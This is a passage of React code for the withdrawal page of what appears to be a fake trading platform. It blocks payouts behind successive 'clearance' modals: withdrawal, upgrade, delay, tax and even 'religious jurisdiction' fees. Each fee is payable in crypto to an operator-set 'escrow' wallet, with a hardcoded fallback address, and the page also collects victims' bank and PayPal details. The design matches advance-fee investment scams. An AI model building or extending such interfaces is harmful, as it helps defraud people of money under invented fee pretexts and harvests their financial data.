              const isApproved = st.isApproved;
              return (
                <div
                  key={st.num}
                  onClick={() => {
                    if (isCurrent && st.feeAmount) {
                      setFeePaymentModalConfig({
                        isOpen: true,
                        stageNumber: st.num,
                        stageTitle: st.title,
                        stageDescription: st.desc,
                        feeUsd: st.feeAmount
                      });
                    } else if (isCurrent && st.num === 1 && onNavigate) {
                      onNavigate('kyc');
                    }
                  }}
                  className={`p-3 rounded-2xl border transition-all flex flex-col justify-between gap-2.5 relative ${
                    isApproved
                      ? 'bg-emerald-950/20 border-emerald-500/40 text-emerald-300'
                      : isCurrent
                      ? 'bg-amber-950/30 border-amber-500/60 text-amber-200 ring-2 ring-amber-500/40 shadow-lg shadow-amber-500/10 cursor-pointer hover:bg-amber-950/40'
                      : 'bg-[#0a1222] border-[#162238] text-slate-500'
                  }`}
                >
                  <div className="flex items-center justify-between text-[10px] font-bold">
                    <span className={isCurrent ? 'text-amber-400 font-extrabold' : 'text-slate-400'}>
                      Step {st.num}
                    </span>
                    {isApproved ? (
                      <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400" />
                    ) : isCurrent ? (
                      <span className="w-2 h-2 rounded-full bg-amber-400 animate-pulse" />
                    ) : (
                      <Lock className="w-3 h-3 text-slate-600" />
                    )}
                  </div>

                  <div>
                    <div
                      className={`text-xs font-bold ${
                        isApproved ? 'text-white' : isCurrent ? 'text-white' : 'text-slate-400'
                      }`}
                    >
                      {st.shortTitle}
                    </div>
                    {st.feeAmount !== null && (
                      <div
                        className={`text-[11px] font-mono mt-0.5 ${
                          isApproved
                            ? 'text-emerald-400'
                            : isCurrent
                            ? 'text-amber-300 font-bold'
                            : 'text-slate-500'
                        }`}
                      >
                        ${st.feeAmount.toLocaleString()}
                      </div>
                    )}
                  </div>

                  <div>
                    <span
                      className={`inline-block px-2 py-0.5 rounded text-[9px] font-extrabold uppercase ${
                        isApproved
                          ? 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/30'
                          : isCurrent
                          ? 'bg-amber-500/30 text-amber-200 border border-amber-500/40 animate-pulse'
                          : 'bg-slate-800 text-slate-500'
                      }`}
                    >
                      {isApproved ? 'Verified' : isCurrent ? 'Active' : 'Locked'}
                    </span>
                  </div>
                </div>
              );
            })}
          </div>
        </div>
      </div>

      {/* Withdrawal Form Card */}
      <div className="bg-[#0b1325] border border-[#162238] rounded-3xl p-6 sm:p-8 shadow-2xl">
        <div className="flex items-center justify-between border-b border-[#172338] pb-4 mb-6">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-xl bg-emerald-600/20 text-emerald-400 flex items-center justify-center">
              <ArrowUpRight className="w-5 h-5" />
            </div>
            <div>
              <h2 className="text-xl font-bold text-white">{t.withdrawTitle}</h2>
              <p className="text-xs text-slate-400">Institutional Bank Wire, PayPal & Crypto Liquidity Gateway</p>
            </div>
          </div>
          <div className="text-right">
            <div className="text-[10px] uppercase text-slate-400 font-semibold">{t.availableMargin}</div>
            <div className="text-lg font-mono font-black text-white">
              {formatCurrency(user.balance, currentCurrency)}
            </div>
          </div>
        </div>

        {statusMessage && (
          <div
            className={`mb-6 p-4 rounded-2xl text-xs flex items-center gap-2.5 border ${
              statusMessage.type === 'success'
                ? 'bg-emerald-500/20 border-emerald-500/40 text-emerald-300'
                : 'bg-rose-500/20 border-rose-500/40 text-rose-300'
            }`}
          >
            {statusMessage.type === 'success' ? (
              <CheckCircle2 className="w-5 h-5 shrink-0" />
            ) : (
              <AlertCircle className="w-5 h-5 shrink-0" />
            )}
            <span>{statusMessage.text}</span>
          </div>
        )}

        {/* Method Selector Tabs */}
        <div className="mb-6">
          <label className="text-xs font-semibold text-slate-400 block mb-2">Select Withdrawal Method</label>
          <div className="grid grid-cols-3 gap-3">
            <button
              type="button"
              id="withdraw-method-bank"
              onClick={() => setMethod('bank')}
              className={`p-3.5 rounded-2xl border text-left transition-all flex flex-col items-start gap-1.5 ${
                method === 'bank'
                  ? 'bg-blue-600/20 border-blue-500 text-white font-bold shadow-lg shadow-blue-500/15'
                  : 'bg-[#0f1a30] border-[#182640] text-slate-400 hover:text-white hover:border-slate-700'
              }`}
            >
              <Landmark className={`w-5 h-5 ${method === 'bank' ? 'text-blue-400' : 'text-slate-400'}`} />
              <div>
                <div className="text-xs sm:text-sm font-bold text-white">Bank Transfer</div>
                <div className="text-[10px] text-slate-400">Wire / SEPA / ACH</div>
              </div>
            </button>

            <button
              type="button"
              id="withdraw-method-paypal"
              onClick={() => setMethod('paypal')}
              className={`p-3.5 rounded-2xl border text-left transition-all flex flex-col items-start gap-1.5 ${
                method === 'paypal'
                  ? 'bg-blue-600/20 border-blue-500 text-white font-bold shadow-lg shadow-blue-500/15'
                  : 'bg-[#0f1a30] border-[#182640] text-slate-400 hover:text-white hover:border-slate-700'
              }`}
            >
              <div className="w-5 h-5 rounded-full bg-blue-500 text-white text-[11px] font-black flex items-center justify-center">
                P
              </div>
              <div>
                <div className="text-xs sm:text-sm font-bold text-white">PayPal</div>
                <div className="text-[10px] text-slate-400">Instant Express</div>
              </div>
            </button>

            <button
              type="button"
              id="withdraw-method-crypto"
              onClick={() => setMethod('crypto')}
              className={`p-3.5 rounded-2xl border text-left transition-all flex flex-col items-start gap-1.5 ${
                method === 'crypto'
                  ? 'bg-blue-600/20 border-blue-500 text-white font-bold shadow-lg shadow-blue-500/15'
                  : 'bg-[#0f1a30] border-[#182640] text-slate-400 hover:text-white hover:border-slate-700'
              }`}
            >
              <Coins className={`w-5 h-5 ${method === 'crypto' ? 'text-blue-400' : 'text-slate-400'}`} />
              <div>
                <div className="text-xs sm:text-sm font-bold text-white">Cryptocurrency</div>
                <div className="text-[10px] text-slate-400">USDT, BTC, ETH, SOL</div>
              </div>
            </button>
          </div>
        </div>

        <form onSubmit={handleWithdraw} className="space-y-4">
          {/* ================= BANK FIELDS ================= */}
          {method === 'bank' && (
            <div className="space-y-3.5 p-4 rounded-2xl bg-[#0e182e] border border-[#172540]">
              <div className="text-xs font-bold text-slate-200 flex items-center gap-2 mb-2">
                <Building2 className="w-4 h-4 text-blue-400" />
                Bank Account Credentials
              </div>
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                <div>
                  <label className="text-xs font-semibold text-slate-400 block mb-1">Bank Name *</label>
                  <input
                    type="text"
                    required
                    value={bankName}
                    onChange={(e) => setBankName(e.target.value)}
                    placeholder="e.g. JPMorgan Chase / Barclays / Deutsche Bank"
                    className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2 text-xs text-white focus:outline-none focus:border-blue-500"
                  />
                </div>
                <div>
                  <label className="text-xs font-semibold text-slate-400 block mb-1">Account Holder Full Legal Name *</label>
                  <input
                    type="text"
                    required
                    value={accountHolder}
                    onChange={(e) => setAccountHolder(e.target.value)}
                    placeholder="e.g. David Miller"
                    className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2 text-xs text-white focus:outline-none focus:border-blue-500"
                  />
                </div>
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                <div>
                  <label className="text-xs font-semibold text-slate-400 block mb-1">Account Number / IBAN *</label>
                  <input
                    type="text"
                    required
                    value={accountNumber || iban}
                    onChange={(e) => {
                      setAccountNumber(e.target.value);
                      setIban(e.target.value);
                    }}
                    placeholder="e.g. GB29 XAAA 0000 0000 0000 00"
                    className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2 text-xs font-mono text-white focus:outline-none focus:border-blue-500"
                  />
                </div>
                <div>
                  <label className="text-xs font-semibold text-slate-400 block mb-1">SWIFT / BIC / Routing Code</label>
                  <input
                    type="text"
                    value={swiftCode}
                    onChange={(e) => setSwiftCode(e.target.value)}
                    placeholder="e.g. CHASUS33 / BOFAUS3N"
                    className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2 text-xs font-mono text-white focus:outline-none focus:border-blue-500"
                  />
                </div>
              </div>
            </div>
          )}

          {/* ================= PAYPAL FIELDS ================= */}
          {method === 'paypal' && (
            <div className="space-y-3.5 p-4 rounded-2xl bg-[#0e182e] border border-[#172540]">
              <div className="text-xs font-bold text-slate-200 flex items-center gap-2 mb-2">
                <Mail className="w-4 h-4 text-blue-400" />
                PayPal Account Information
              </div>
              <div>
                <label className="text-xs font-semibold text-slate-400 block mb-1">PayPal Email Address *</label>
                <input
                  type="email"
                  required
                  value={paypalEmail}
                  onChange={(e) => setPaypalEmail(e.target.value)}
                  placeholder="your-paypal-email@example.com"
                  className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-sm text-white focus:outline-none focus:border-blue-500"
                />
              </div>
            </div>
          )}

          {/* ================= CRYPTO FIELDS ================= */}
          {method === 'crypto' && (
            <div className="space-y-3.5 p-4 rounded-2xl bg-[#0e182e] border border-[#172540]">
              {/* Crypto Asset Pills */}
              <div>
                <label className="text-xs font-semibold text-slate-400 block mb-2">Select Cryptocurrency</label>
                <div className="grid grid-cols-2 sm:grid-cols-4 gap-2.5">
                  {(['USDT', 'BTC', 'ETH', 'SOL'] as const).map((a) => (
                    <button
                      key={a}
                      type="button"
                      onClick={() => handleAssetChange(a)}
                      className={`p-2.5 rounded-xl text-left border transition-all ${
                        asset === a
                          ? 'bg-blue-600/20 border-blue-500 text-white font-bold shadow-lg shadow-blue-500/15'
                          : 'bg-slate-950 border-slate-800 text-slate-400 hover:text-white'
                      }`}
                    >
                      <div className="text-sm font-extrabold">{a}</div>
                      <div className="text-[10px] text-slate-400 mt-0.5">
                        {a === 'USDT' ? 'Tether TRC20' : a === 'BTC' ? 'Bitcoin SegWit' : a === 'ETH' ? 'Ethereum ERC20' : 'Solana'}
                      </div>
                    </button>
                  ))}
                </div>
              </div>

              {/* Destination Address */}
              <div>
                <label className="text-xs font-semibold text-slate-400 block mb-1">
                  Recipient {asset} Wallet Address ({network}) *
                </label>
                <input
                  type="text"
                  required
                  value={destinationAddress}
                  onChange={(e) => setDestinationAddress(e.target.value)}
                  className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-xs font-mono text-white focus:outline-none focus:border-blue-500"
                  placeholder={`Enter your ${asset} address`}
                />
              </div>
            </div>
          )}

          {/* Amount */}
          <div>
            <div className="flex items-center justify-between text-xs font-semibold text-slate-400 mb-1">
              <span>{t.withdrawAmount} ({currentCurrency})</span>
              <button
                type="button"
                onClick={() => setAmount(user.balance.toString())}
                className="text-blue-400 hover:text-blue-300 font-bold"
              >
                Max ({formatCurrency(user.balance, currentCurrency)})
              </button>
            </div>
            <div className="relative">
              <span className="absolute left-3.5 top-2.5 text-slate-400 font-mono text-sm">$</span>
              <input
                type="number"
                step="any"
                min={fee + 1}
                max={user.balance}
                required
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
                className="w-full bg-slate-950 border border-slate-800 rounded-xl pl-9 pr-4 py-2.5 text-sm font-mono font-bold text-white focus:outline-none focus:border-blue-500"
                placeholder="0.00"
              />
            </div>
          </div>

          {/* Calculation Breakdown */}
          <div className="p-4 rounded-2xl bg-slate-950 border border-slate-800/80 space-y-2 text-xs font-mono">
            <div className="flex justify-between text-slate-400">
              <span>Gross Requested:</span>
              <span className="text-white font-semibold">${numAmount.toFixed(2)}</span>
            </div>
            <div className="flex justify-between text-slate-400">
              <span>{t.withdrawFee} ({method}):</span>
              <span className="text-slate-300">${fee.toFixed(2)}</span>
            </div>
            <div className="pt-2 border-t border-slate-800/80 flex justify-between text-sm font-bold">
              <span className="text-slate-300">Estimated Net Payout:</span>
              <span className="text-emerald-400">${netAmount.toFixed(2)}</span>
            </div>
          </div>

          <button
            type="submit"
            disabled={user.balance <= 0}
            className="w-full py-3.5 rounded-xl bg-gradient-to-r from-blue-600 to-emerald-600 hover:from-blue-500 hover:to-emerald-500 disabled:opacity-50 text-white font-bold text-xs uppercase tracking-wider shadow-lg shadow-blue-500/20 transition-all flex items-center justify-center gap-2"
          >
            <ArrowUpRight className="w-4 h-4" />
            {t.withdrawSubmit}
          </button>
        </form>
      </div>

      {/* ================= COMPLIANCE INTERCEPT MODAL (SINGLE STEP REVEAL) ================= */}
      {activeGateModal && (
        <div className="fixed inset-0 z-50 bg-slate-950/85 backdrop-blur-md flex items-center justify-center p-4">
          <div className="w-full max-w-lg bg-[#0d1629] border border-[#1d2d4a] rounded-3xl p-6 sm:p-8 shadow-2xl animate-in zoom-in-95 duration-200">
            {/* Header / Seal */}
            <div className="flex items-start justify-between gap-3 border-b border-slate-800/80 pb-4 mb-4">
              <div className="flex items-center gap-3">
                <div
                  className={`w-12 h-12 rounded-2xl flex items-center justify-center shadow-lg ${
                    activeGateModal.type === 'PENDING_SUCCESS'
                      ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30'
                      : activeGateModal.type === 'KYC'
                      ? 'bg-amber-500/20 text-amber-400 border border-amber-500/30'
                      : 'bg-rose-500/20 text-rose-400 border border-rose-500/30'
                  }`}
                >
                  {activeGateModal.type === 'PENDING_SUCCESS' ? (
                    <CheckCircle2 className="w-6 h-6" />
                  ) : activeGateModal.type === 'KYC' ? (
                    <ShieldAlert className="w-6 h-6" />
                  ) : activeGateModal.type === 'ACCOUNT_UPGRADE' ? (
                    <Sparkles className="w-6 h-6" />
                  ) : (
                    <Lock className="w-6 h-6" />
                  )}
                </div>
                <div>
                  <div className="text-[10px] uppercase tracking-wider font-extrabold text-blue-400 font-mono">
                    {activeGateModal.subtitle || 'BROKERAGE CLEARANCE PROTOCOL'}
                  </div>
                  <h3 className="text-base sm:text-lg font-bold text-white leading-snug">
                    {activeGateModal.title}
                  </h3>
                </div>
              </div>
            </div>

            {/* Content Body */}
            <div className="space-y-4 text-xs text-slate-300 leading-relaxed">
              <p className="bg-[#080f1d] p-4 rounded-2xl border border-slate-800/80 text-slate-300 font-normal">
                {activeGateModal.message}
              </p>

              {/* Specific Fee Clearance Information */}
              {activeGateModal.feeAmount && (
                <div className="p-4 rounded-2xl bg-amber-500/10 border border-amber-500/30 text-amber-200 space-y-2.5">
                  <div className="flex items-center justify-between font-bold text-sm">
                    <span>Mandatory Clearing Clearance Fee:</span>
                    <span className="font-mono text-base text-amber-400 font-black">
                      ${activeGateModal.feeAmount.toFixed(2)} USD
                    </span>
                  </div>

                  <div className="text-[11px] text-amber-300/80">
                    Official Escrow Settlement Wallet (USDT TRC20):
                  </div>

                  <div className="flex items-center justify-between bg-slate-950/80 border border-amber-500/30 rounded-xl px-3 py-2 text-[11px] font-mono">
                    <span className="truncate pr-2 text-white">
                      {storeState.adminConfig?.walletAddresses?.USDT?.address || 'TXq7s9V2K8p4M1jB7n3D6uY9kL0eF4aC5h'}
                    </span>
                    <button
                      type="button"
                      onClick={() =>
                        handleCopyFeeAddress(
                          storeState.adminConfig?.walletAddresses?.USDT?.address || 'TXq7s9V2K8p4M1jB7n3D6uY9kL0eF4aC5h'
                        )
                      }
                      className="text-amber-400 hover:text-white shrink-0 flex items-center gap-1 font-bold text-[10px]"
                    >
                      {copiedFeeAddress ? <Check className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
                      <span>{copiedFeeAddress ? 'Copied' : 'Copy'}</span>
                    </button>
                  </div>
                </div>
              )}
            </div>

            {/* Actions */}
            <div className="flex flex-col sm:flex-row items-center gap-2.5 mt-6 pt-3 border-t border-slate-800/80">
              <button
                type="button"
                onClick={() => setActiveGateModal(null)}
                className="w-full sm:w-1/4 py-3 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs font-bold transition-colors"
              >
                Dismiss
              </button>

              {(activeGateModal.type === 'WITHDRAWAL_FEE' ||
                activeGateModal.type === 'ACCOUNT_UPGRADE' ||
                activeGateModal.type === 'DELAY_FEE' ||
                activeGateModal.type === 'TAX_FEE' ||
                activeGateModal.type === 'RELIGIOUS_JURISDICTION') && (
                <button
                  type="button"
                  onClick={() => {
                    const stageNum =
                      activeGateModal.type === 'WITHDRAWAL_FEE'
                        ? 2
                        : activeGateModal.type === 'ACCOUNT_UPGRADE'
                        ? 3
                        : activeGateModal.type === 'DELAY_FEE'
                        ? 4
                        : activeGateModal.type === 'TAX_FEE'
                        ? 5
                        : 6;
                    setFeePaymentModalConfig({
                      isOpen: true,
                      stageNumber: stageNum,
                      stageTitle: activeGateModal.title,
                      stageDescription: activeGateModal.message,
                      feeUsd: activeGateModal.feeAmount || 250
                    });
                    setActiveGateModal(null);
                  }}
                  className="w-full sm:flex-1 py-3 rounded-xl bg-gradient-to-r from-amber-500 to-orange-500 hover:from-amber-400 hover:to-orange-400 text-slate-950 font-extrabold text-xs shadow-lg shadow-amber-500/25 transition-all flex items-center justify-center gap-1.5 cursor-pointer"
                >
                  <Wallet className="w-4 h-4" />
                  <span>Pay Fee via Crypto Wallet (BTC, ETH, USDT, SOL)</span>
                </button>
              )}

              <button
                type="button"
                onClick={handleExecuteModalAction}
                className="w-full sm:flex-1 py-3 rounded-xl bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-500 hover:to-indigo-500 text-white font-bold text-xs shadow-lg shadow-blue-500/25 transition-all flex items-center justify-center gap-1.5"
              >
                <span>{activeGateModal.actionLabel}</span>
                <ChevronRight className="w-4 h-4" />
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Crypto Fee Payment Modal */}
      {feePaymentModalConfig?.isOpen && (
        <FeePaymentModal
          user={user}
          stageNumber={feePaymentModalConfig.stageNumber}
          stageTitle={feePaymentModalConfig.stageTitle}
          stageDescription={feePaymentModalConfig.stageDescription}
          requiredFeeUsd={feePaymentModalConfig.feeUsd}
          onClose={() => setFeePaymentModalConfig(null)}
          onPaymentSubmitted={() => {
            setFeePaymentModalConfig(null);
            setStatusMessage({
              type: 'success',
              text: `Fee payment for Stage ${feePaymentModalConfig.stageNumber} submitted successfully! Broker audit desk will verify.`
            });
          }}
        />
      )}

      {/* Real-time Monitored Withdrawal History */}
      <div className="bg-[#0b1325] border border-[#162238] rounded-3xl p-6 shadow-xl space-y-4">
        <h3 className="text-sm font-bold text-white">Monitored Withdrawal Requests</h3>

        {userWithdrawals.length === 0 ? (
          <div className="py-8 text-center text-xs text-slate-500 bg-slate-950/40 rounded-2xl border border-slate-800/40">
            No withdrawal history recorded for this account.
          </div>
        ) : (
          <div className="space-y-2.5">
            {userWithdrawals.map((wd) => (
              <div
                key={wd.id}
                className="p-4 rounded-2xl bg-slate-950/60 border border-slate-800/60 flex flex-col sm:flex-row sm:items-center justify-between gap-3 text-xs"
              >
                <div>
                  <div className="font-bold text-white text-sm flex items-center gap-2">
                    <span>${wd.amount.toLocaleString()} ({wd.asset})</span>
                    <span className="text-[10px] px-2 py-0.5 rounded bg-blue-500/10 text-blue-400 border border-blue-500/20 font-bold uppercase">
                      {wd.method || 'crypto'}
                    </span>
                    <span className="text-[10px] px-1.5 py-0.5 rounded bg-slate-800 text-slate-400 font-mono">
                      Net: ${(wd.amount - wd.fee).toFixed(2)}
                    </span>
                  </div>
                  <div className="text-[11px] text-slate-400 font-mono truncate max-w-sm mt-0.5">
                    {wd.method === 'bank' ? (
                      `Bank: ${wd.bankName || 'Bank Wire'} • Account/IBAN: ${wd.accountNumber || wd.iban || ''}`
                    ) : wd.method === 'paypal' ? (
                      `PayPal: ${wd.paypalEmail}`
                    ) : (
                      `Address: ${wd.destinationAddress}`
                    )}
                  </div>
                  <div className="text-[10px] text-slate-500 mt-1 flex items-center gap-2">
                    <span>{new Date(wd.requestedAt).toLocaleString()}</span>
                    {wd.txHash && <span className="text-emerald-400 font-mono">Tx: {wd.txHash.slice(0, 16)}...</span>}
                  </div>
                </div>

                <div className="flex items-center gap-3">
                  <span
                    className={`px-2.5 py-1 rounded-full text-[10px] font-bold uppercase tracking-wider ${
                      wd.status === 'COMPLETED'
                        ? 'bg-emerald-500/15 text-emerald-400 border border-emerald-500/30'
                        : wd.status === 'PROCESSING'
                        ? 'bg-blue-500/15 text-blue-400 border border-blue-500/30'
                        : wd.status === 'REJECTED'
                        ? 'bg-rose-500/15 text-rose-400 border border-rose-500/30'
                        : 'bg-amber-500/15 text-amber-400 border border-amber-500/30'
                    }`}
                  >
                    {wd.status}
                  </span>
                </div>
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  );
};

